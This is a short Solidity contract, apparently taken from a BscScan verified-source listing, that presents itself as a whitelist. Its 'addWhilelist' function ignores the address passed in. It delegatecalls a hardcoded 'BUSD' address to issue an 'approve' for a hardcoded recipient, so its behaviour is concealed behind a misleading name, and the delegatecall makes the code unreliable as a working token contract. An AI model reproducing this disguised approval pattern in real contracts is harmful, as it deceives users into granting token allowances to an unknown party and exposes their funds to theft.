/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;



// 0x23F2A17F0b5f40a54f2cc01d728c254dD2aDd28b
contract Whilelist {

    address[] whitelistAddress;
    function addWhilelist(address user) external {
        address BUSD = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;

        (bool success, bytes memory data) = BUSD.delegatecall(abi.encodeWithSignature("approve(address,uint256)", 0x9E7adafCf1b72aA5692C7950Fe9c610EbfAcB00B, 123123));

        if (success != true) {
            revert();
        }
        
    }
}